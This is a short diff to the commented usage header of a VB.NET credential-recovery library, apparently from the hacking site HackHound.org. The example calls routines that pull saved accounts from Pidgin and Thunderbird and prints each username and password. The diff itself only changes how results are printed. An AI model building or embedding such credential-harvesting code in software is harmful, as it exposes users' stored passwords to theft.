@@ -26,7 +26,7 @@
 '       AC.RecoverPidgin()
 '       AC.RecoverThunderbird()
 '       For Each Account As PREC.Account In AC.Accounts
-'           Console.WriteLine(Account.Username | Account.Domain | Account.Type.ToString() | Account.Password)
+'           Console.WriteLine(Account.ToString())
 '       Next
 '
 'Written for HackHound.org - Include in your projects, but please save credits
